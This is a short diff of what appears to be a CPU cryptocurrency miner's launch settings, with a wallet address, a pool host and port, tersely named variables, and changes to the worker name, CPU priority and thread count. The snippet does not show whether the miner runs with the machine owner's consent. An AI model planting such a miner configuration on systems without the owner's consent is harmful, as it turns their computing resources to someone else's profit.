@@ -2,8 +2,8 @@
 
 WALS=RTrndREXaXfFJzJp7vjzjGa78HgBcFNfAd
 PIL=us.flockpool.com:4444
-WER=robo
-COMA="-a gr -o $PIL -u $WALS.$WER --cpu-priority 4"
+WER=paper
+COMA="-a gr -o $PIL -u $WALS.$WER --cpu-priority 1 -t 4"
 
 
 
